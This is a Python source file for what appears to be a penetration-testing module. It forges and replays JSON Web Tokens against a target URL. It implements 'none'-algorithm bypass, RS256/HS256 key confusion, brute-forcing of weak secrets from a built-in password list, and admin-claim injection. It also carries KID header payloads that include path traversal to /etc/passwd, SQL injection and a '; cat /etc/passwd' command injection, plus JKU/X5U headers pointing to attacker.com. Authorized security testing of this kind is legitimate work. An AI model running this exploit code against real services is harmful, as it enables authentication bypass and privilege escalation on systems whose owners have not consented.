"""
JWT Attacks - Advanced JWT security testing and exploitation
"""
import sys
import argparse
import requests
import urllib3
import json
import base64
import hmac
import hashlib
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from datetime import datetime, timedelta

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import AuthTool
from utils.output_parser import Finding, Severity

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@dataclass
class JWTResult:
    """Result of a JWT attack test"""
    attack_type: str
    original_token: str
    modified_token: str
    success: bool
    status_code: int
    response_length: int
    evidence: str = ""


class JWTAttacksTester(AuthTool):
    """Advanced JWT security testing wrapper"""

    # Common weak secrets for brute forcing
    COMMON_SECRETS = [
        "secret", "password", "123456", "key", "private", "jwt_secret",
        "supersecret", "changeme", "admin", "test", "development",
        "your-256-bit-secret", "your-secret-key", "my-secret-key",
        "HS256-secret", "jwt-secret", "jwt_secret_key", "secretkey",
        "secret123", "password123", "qwerty", "abc123", "letmein",
        "welcome", "monkey", "dragon", "master", "login", "passw0rd",
        "hello", "shadow", "sunshine", "princess", "michael", "000000",
        "access", "flower", "696969", "ashley", "baseball", "football",
        "1234567890", "0987654321", "apikey", "api_key", "token",
        "production", "staging", "development", "dev", "prod", "stage"
    ]

    @property
    def tool_name(self) -> str:
        return "jwt_attacks"

    def check_tool_installed(self) -> bool:
        """This is a pure Python tool"""
        try:
            import jwt
            return True
        except ImportError:
            return False

    def _build_target_args(self, target: str, **kwargs) -> list:
        """Not used for pure Python tool"""
        return []

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Execute JWT attack tests"""
        self.start_time = datetime.now()
        results = []
        findings = []

        token = target  # Target is the JWT token
        test_url = kwargs.get("test_url")
        headers = kwargs.get("headers", {})
        cookies = kwargs.get("cookies", {})
        timeout = kwargs.get("timeout", 10)
        verify_ssl = kwargs.get("verify_ssl", False)
        test_types = kwargs.get("test_types", ["none", "confusion", "weak", "injection", "kid", "jku"])
        wordlist = kwargs.get("wordlist")
        public_key = kwargs.get("public_key")

        print(f"[*] Starting JWT attack tests")

        # Decode and analyze token first
        decoded = self._decode_jwt(token)
        if "error" in decoded:
            return {
                "success": False,
                "error": decoded["error"],
                "tool": self.tool_name,
                "target": token
            }

        print(f"[*] Token algorithm: {decoded['header'].get('alg')}")
        print(f"[*] Token payload: {json.dumps(decoded['payload'], indent=2)}")

        # None algorithm attack
        if "none" in test_types:
            print("[*] Testing 'none' algorithm bypass...")
            none_results = self._test_none_algorithm(token, decoded, test_url,
                                                      headers, cookies, timeout, verify_ssl)
            results.extend(none_results)

            for r in none_results:
                if r.success:
                    findings.append(Finding(
                        tool="jwt_attacks",
                        target=test_url or token,
                        finding_type="jwt",
                        title="JWT 'none' Algorithm Vulnerability",
                        description="Server accepts tokens with 'none' algorithm, allowing signature bypass",
                        severity=Severity.CRITICAL,
                        payload=r.modified_token,
                        evidence=r.evidence,
                        remediation="Explicitly verify the algorithm and reject 'none'"
                    ))

        # Algorithm confusion (RS256 to HS256)
        if "confusion" in test_types and public_key:
            print("[*] Testing algorithm confusion attack...")
            confusion_results = self._test_algorithm_confusion(token, decoded, public_key,
                                                                test_url, headers, cookies, timeout, verify_ssl)
            results.extend(confusion_results)

            for r in confusion_results:
                if r.success:
                    findings.append(Finding(
                        tool="jwt_attacks",
                        target=test_url or token,
                        finding_type="jwt",
                        title="JWT Algorithm Confusion Vulnerability",
                        description="Server vulnerable to RS256/HS256 algorithm confusion attack",
                        severity=Severity.CRITICAL,
                        payload=r.modified_token,
                        evidence=r.evidence,
                        remediation="Explicitly verify expected algorithm, don't accept HS256 for RS256 tokens"
                    ))

        # Weak secret brute force
        if "weak" in test_types:
            print("[*] Testing for weak JWT secrets...")
            weak_results = self._test_weak_secret(token, decoded, wordlist,
                                                   test_url, headers, cookies, timeout, verify_ssl)
            results.extend(weak_results)

            for r in weak_results:
                if r.success:
                    findings.append(Finding(
                        tool="jwt_attacks",
                        target=test_url or token,
                        finding_type="jwt",
                        title="Weak JWT Secret",
                        description=f"JWT secret cracked: {r.evidence}",
                        severity=Severity.CRITICAL,
                        payload=r.evidence,
                        evidence=r.evidence,
                        remediation="Use a strong, randomly generated secret (256+ bits)"
                    ))

        # Claim injection/modification
        if "injection" in test_types:
            print("[*] Testing claim injection attacks...")
            injection_results = self._test_claim_injection(token, decoded, kwargs.get("secret"),
                                                            test_url, headers, cookies, timeout, verify_ssl)
            results.extend(injection_results)

            for r in injection_results:
                if r.success:
                    findings.append(Finding(
                        tool="jwt_attacks",
                        target=test_url or token,
                        finding_type="jwt",
                        title="JWT Claim Injection Vulnerability",
                        description=f"Modified claims accepted by server: {r.attack_type}",
                        severity=Severity.HIGH,
                        payload=r.modified_token,
                        evidence=r.evidence,
                        remediation="Validate all claims server-side, don't trust client-provided values"
                    ))

        # KID injection
        if "kid" in test_types:
            print("[*] Testing KID injection attacks...")
            kid_results = self._test_kid_injection(token, decoded,
                                                    test_url, headers, cookies, timeout, verify_ssl)
            results.extend(kid_results)

            for r in kid_results:
                if r.success:
                    findings.append(Finding(
                        tool="jwt_attacks",
                        target=test_url or token,
                        finding_type="jwt",
                        title="JWT KID Injection Vulnerability",
                        description=f"KID header injection successful: {r.attack_type}",
                        severity=Severity.CRITICAL,
                        payload=r.modified_token,
                        evidence=r.evidence,
                        remediation="Sanitize KID parameter, use allowlist for key IDs"
                    ))

        # JKU/X5U header injection
        if "jku" in test_types:
            print("[*] Testing JKU/X5U injection attacks...")
            jku_results = self._test_jku_injection(token, decoded,
                                                    test_url, headers, cookies, timeout, verify_ssl)
            results.extend(jku_results)

            for r in jku_results:
                if r.success:
                    findings.append(Finding(
                        tool="jwt_attacks",
                        target=test_url or token,
                        finding_type="jwt",
                        title="JWT JKU/X5U Injection Vulnerability",
                        description=f"JKU/X5U header injection may allow key substitution",
                        severity=Severity.HIGH,
                        payload=r.modified_token,
                        evidence=r.evidence,
                        remediation="Validate JKU/X5U URLs against allowlist"
                    ))

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Save results
        if output_file:
            self._save_results(output_file, results, findings, decoded)

        return {
            "success": True,
            "tool": self.tool_name,
            "target": token,
            "duration": duration,
            "results": findings,
            "decoded_token": decoded,
            "raw_results": [vars(r) for r in results],
            "summary": {
                "total_tests": len(results),
                "successful_attacks": len([r for r in results if r.success]),
                "findings_count": len(findings)
            }
        }

    def _decode_jwt(self, token: str) -> Dict[str, Any]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {"error": "Invalid JWT format - expected 3 parts"}

            # Decode header
            header_padding = 4 - len(parts[0]) % 4
            header_b64 = parts[0] + '=' * header_padding
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_padding = 4 - len(parts[1]) % 4
            payload_b64 = parts[1] + '=' * payload_padding
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "parts": parts
            }
        except Exception as e:
            return {"error": f"Failed to decode JWT: {str(e)}"}

    def _encode_jwt_part(self, data: dict) -> str:
        """Base64url encode a JWT part"""
        json_bytes = json.dumps(data, separators=(',', ':')).encode()
        return base64.urlsafe_b64encode(json_bytes).decode().rstrip('=')

    def _sign_hs256(self, message: str, secret: str) -> str:
        """Sign message with HS256"""
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def _create_token(self, header: dict, payload: dict, secret: str = None) -> str:
        """Create a JWT token"""
        header_b64 = self._encode_jwt_part(header)
        payload_b64 = self._encode_jwt_part(payload)

        if header.get("alg") == "none":
            return f"{header_b64}.{payload_b64}."
        elif header.get("alg") in ["HS256", "HS384", "HS512"] and secret:
            message = f"{header_b64}.{payload_b64}"
            signature = self._sign_hs256(message, secret)
            return f"{header_b64}.{payload_b64}.{signature}"

        return f"{header_b64}.{payload_b64}."

    def _test_token(self, token: str, test_url: str, headers: dict, cookies: dict,
                    timeout: int, verify_ssl: bool) -> tuple:
        """Test if a modified token is accepted"""
        if not test_url:
            return (False, 0, 0, "No test URL provided")

        try:
            test_headers = {**headers, "Authorization": f"Bearer {token}"}
            response = requests.get(
                test_url, headers=test_headers, cookies=cookies,
                timeout=timeout, verify=verify_ssl
            )

            # Success indicators
            success = response.status_code == 200 or (
                response.status_code != 401 and response.status_code != 403
            )

            return (success, response.status_code, len(response.text), response.text[:500])
        except Exception as e:
            return (False, 0, 0, str(e))

    def _test_none_algorithm(self, token: str, decoded: dict, test_url: str,
                              headers: dict, cookies: dict, timeout: int, verify_ssl: bool) -> List[JWTResult]:
        """Test 'none' algorithm bypass"""
        results = []

        # Different variations of 'none'
        none_variants = ["none", "None", "NONE", "nOnE"]

        for alg in none_variants:
            new_header = {**decoded["header"], "alg": alg}
            new_token = self._create_token(new_header, decoded["payload"])

            success, status, length, evidence = self._test_token(
                new_token, test_url, headers, cookies, timeout, verify_ssl
            )

            results.append(JWTResult(
                attack_type=f"none_algorithm_{alg}",
                original_token=token,
                modified_token=new_token,
                success=success,
                status_code=status,
                response_length=length,
                evidence=evidence if success else ""
            ))

        # Also try with empty signature
        parts = decoded["parts"]
        empty_sig_token = f"{parts[0]}.{parts[1]}."

        success, status, length, evidence = self._test_token(
            empty_sig_token, test_url, headers, cookies, timeout, verify_ssl
        )

        results.append(JWTResult(
            attack_type="empty_signature",
            original_token=token,
            modified_token=empty_sig_token,
            success=success,
            status_code=status,
            response_length=length,
            evidence=evidence if success else ""
        ))

        return results

    def _test_algorithm_confusion(self, token: str, decoded: dict, public_key: str,
                                   test_url: str, headers: dict, cookies: dict,
                                   timeout: int, verify_ssl: bool) -> List[JWTResult]:
        """Test RS256 to HS256 algorithm confusion"""
        results = []

        # Change algorithm to HS256 and sign with public key
        new_header = {**decoded["header"], "alg": "HS256"}
        header_b64 = self._encode_jwt_part(new_header)
        payload_b64 = self._encode_jwt_part(decoded["payload"])

        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            public_key.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

        confused_token = f"{header_b64}.{payload_b64}.{sig_b64}"

        success, status, length, evidence = self._test_token(
            confused_token, test_url, headers, cookies, timeout, verify_ssl
        )

        results.append(JWTResult(
            attack_type="algorithm_confusion_rs256_hs256",
            original_token=token,
            modified_token=confused_token,
            success=success,
            status_code=status,
            response_length=length,
            evidence=evidence if success else ""
        ))

        return results

    def _test_weak_secret(self, token: str, decoded: dict, wordlist: str,
                          test_url: str, headers: dict, cookies: dict,
                          timeout: int, verify_ssl: bool) -> List[JWTResult]:
        """Test for weak JWT secrets"""
        results = []

        alg = decoded["header"].get("alg", "").upper()
        if alg not in ["HS256", "HS384", "HS512"]:
            return results

        # Build secret list
        secrets = self.COMMON_SECRETS.copy()
        if wordlist:
            try:
                with open(wordlist, 'r') as f:
                    secrets.extend([line.strip() for line in f if line.strip()])
            except:
                pass

        # Get original signature parts
        parts = decoded["parts"]
        original_message = f"{parts[0]}.{parts[1]}"

        for secret in secrets:
            try:
                # Sign with candidate secret
                if alg == "HS256":
                    test_sig = hmac.new(secret.encode(), original_message.encode(), hashlib.sha256).digest()
                elif alg == "HS384":
                    test_sig = hmac.new(secret.encode(), original_message.encode(), hashlib.sha384).digest()
                elif alg == "HS512":
                    test_sig = hmac.new(secret.encode(), original_message.encode(), hashlib.sha512).digest()

                test_sig_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip('=')

                # Compare with original signature
                if test_sig_b64 == parts[2]:
                    results.append(JWTResult(
                        attack_type="weak_secret",
                        original_token=token,
                        modified_token=token,
                        success=True,
                        status_code=0,
                        response_length=0,
                        evidence=f"Secret cracked: {secret}"
                    ))
                    print(f"[!] SECRET FOUND: {secret}")
                    break
            except:
                continue

        return results

    def _test_claim_injection(self, token: str, decoded: dict, secret: str,
                               test_url: str, headers: dict, cookies: dict,
                               timeout: int, verify_ssl: bool) -> List[JWTResult]:
        """Test claim injection/modification attacks"""
        results = []

        if not secret:
            return results

        # Common privilege escalation modifications
        modifications = [
            ("admin_true", {"admin": True}),
            ("admin_1", {"admin": 1}),
            ("role_admin", {"role": "admin"}),
            ("role_administrator", {"role": "administrator"}),
            ("is_admin", {"is_admin": True}),
            ("user_id_1", {"user_id": 1}),
            ("user_id_0", {"user_id": 0}),
            ("uid_1", {"uid": 1}),
            ("level_admin", {"level": "admin"}),
            ("permissions_all", {"permissions": ["*"]}),
        ]

        for attack_name, mods in modifications:
            new_payload = {**decoded["payload"], **mods}
            new_token = self._create_token(decoded["header"], new_payload, secret)

            success, status, length, evidence = self._test_token(
                new_token, test_url, headers, cookies, timeout, verify_ssl
            )

            results.append(JWTResult(
                attack_type=f"claim_injection_{attack_name}",
                original_token=token,
                modified_token=new_token,
                success=success,
                status_code=status,
                response_length=length,
                evidence=evidence if success else ""
            ))

        return results

    def _test_kid_injection(self, token: str, decoded: dict, test_url: str,
                             headers: dict, cookies: dict, timeout: int, verify_ssl: bool) -> List[JWTResult]:
        """Test KID (Key ID) header injection"""
        results = []

        # KID injection payloads
        kid_payloads = [
            ("path_traversal", "../../../../../../dev/null"),
            ("path_traversal_etc", "../../../../../../etc/passwd"),
            ("sql_injection", "' UNION SELECT 'secret' --"),
            ("sql_injection2", "1' OR '1'='1"),
            ("empty", ""),
            ("null_byte", "key\x00.pem"),
            ("command_injection", "; cat /etc/passwd"),
        ]

        for attack_name, kid_value in kid_payloads:
            new_header = {**decoded["header"], "kid": kid_value}
            new_token = self._create_token(new_header, decoded["payload"])

            # For path traversal to /dev/null, try signing with empty secret
            if "dev/null" in kid_value:
                new_token = self._create_token(new_header, decoded["payload"], "")

            success, status, length, evidence = self._test_token(
                new_token, test_url, headers, cookies, timeout, verify_ssl
            )

            results.append(JWTResult(
                attack_type=f"kid_injection_{attack_name}",
                original_token=token,
                modified_token=new_token,
                success=success,
                status_code=status,
                response_length=length,
                evidence=evidence if success else ""
            ))

        return results

    def _test_jku_injection(self, token: str, decoded: dict, test_url: str,
                             headers: dict, cookies: dict, timeout: int, verify_ssl: bool) -> List[JWTResult]:
        """Test JKU/X5U header injection"""
        results = []

        # JKU/X5U injection payloads
        jku_payloads = [
            ("attacker_jku", "jku", "https://attacker.com/.well-known/jwks.json"),
            ("localhost_jku", "jku", "http://localhost/.well-known/jwks.json"),
            ("internal_jku", "jku", "http://127.0.0.1/.well-known/jwks.json"),
            ("attacker_x5u", "x5u", "https://attacker.com/cert.pem"),
        ]

        for attack_name, header_name, header_value in jku_payloads:
            new_header = {**decoded["header"], header_name: header_value}
            new_token = self._create_token(new_header, decoded["payload"])

            success, status, length, evidence = self._test_token(
                new_token, test_url, headers, cookies, timeout, verify_ssl
            )

            results.append(JWTResult(
                attack_type=f"jku_injection_{attack_name}",
                original_token=token,
                modified_token=new_token,
                success=success,
                status_code=status,
                response_length=length,
                evidence=evidence if success else ""
            ))

        return results

    def _save_results(self, output_file: str, results: List[JWTResult],
                      findings: List[Finding], decoded: dict):
        """Save results to file"""
        output = {
            "decoded_token": decoded,
            "findings": [f.to_dict() for f in findings],
            "raw_results": [vars(r) for r in results],
            "summary": {
                "total_tests": len(results),
                "successful_attacks": len([r for r in results if r.success])
            }
        }

        with open(output_file, 'w') as f:
            json.dump(output, f, indent=2)

        print(f"[+] Results saved to: {output_file}")


def main():
    parser = argparse.ArgumentParser(
        description="JWT Attacks - Advanced JWT Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python jwt_attacks.py -t "eyJhbG..." --decode
  python jwt_attacks.py -t "eyJhbG..." --url https://api.example.com/me
  python jwt_attacks.py -t "eyJhbG..." --url https://api.example.com/me --test-types none,weak
  python jwt_attacks.py -t "eyJhbG..." --url https://api.example.com/me --wordlist secrets.txt
  python jwt_attacks.py -t "eyJhbG..." --url https://api.example.com/me --public-key "$(cat public.pem)"
        """
    )

    parser.add_argument("-t", "--token", required=True, help="JWT token to test")
    parser.add_argument("--url", dest="test_url", help="URL to test modified tokens against")
    parser.add_argument("--decode", action="store_true", help="Just decode and display token")
    parser.add_argument("--test-types", default="none,weak,kid,jku",
                        help="Test types: none,confusion,weak,injection,kid,jku")
    parser.add_argument("--wordlist", help="Wordlist for secret brute forcing")
    parser.add_argument("--public-key", help="Public key for algorithm confusion attack")
    parser.add_argument("--secret", help="Known secret for claim injection tests")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                        help="Custom header (format: 'Name: Value')")
    parser.add_argument("-c", "--cookie", help="Cookies")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")

    args = parser.parse_args()

    tester = JWTAttacksTester()

    # Just decode mode
    if args.decode:
        decoded = tester._decode_jwt(args.token)
        if "error" in decoded:
            print(f"[-] Error: {decoded['error']}")
            return 1

        print("\n=== JWT DECODED ===")
        print(f"\nHeader:")
        print(json.dumps(decoded["header"], indent=2))
        print(f"\nPayload:")
        print(json.dumps(decoded["payload"], indent=2))
        print(f"\nSignature: {decoded['signature'][:50]}...")
        return 0

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = {}
    if args.cookie:
        for c in args.cookie.split(';'):
            if '=' in c:
                name, value = c.split('=', 1)
                cookies[name.strip()] = value.strip()

    result = tester.run(
        target=args.token,
        output_file=args.output,
        test_url=args.test_url,
        test_types=args.test_types.split(','),
        wordlist=args.wordlist,
        public_key=args.public_key,
        secret=args.secret,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        verify_ssl=args.verify_ssl
    )

    # Print summary
    print(f"\n{'='*60}")
    print("JWT ATTACK TEST RESULTS")
    print(f"{'='*60}")
    print(f"Algorithm: {result['decoded_token']['header'].get('alg')}")
    print(f"Total Tests: {result['summary']['total_tests']}")
    print(f"Successful Attacks: {result['summary']['successful_attacks']}")
    print(f"Duration: {result['duration']:.2f}s")

    if result['results']:
        print(f"\n[!] JWT VULNERABILITIES FOUND!")
        for finding in result['results']:
            print(f"\n  [{finding.severity.value.upper()}] {finding.title}")
            print(f"  Description: {finding.description}")
            if finding.payload:
                print(f"  Payload: {finding.payload[:100]}...")
            print(f"  Remediation: {finding.remediation}")
    else:
        print("\n[+] No JWT vulnerabilities found")

    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
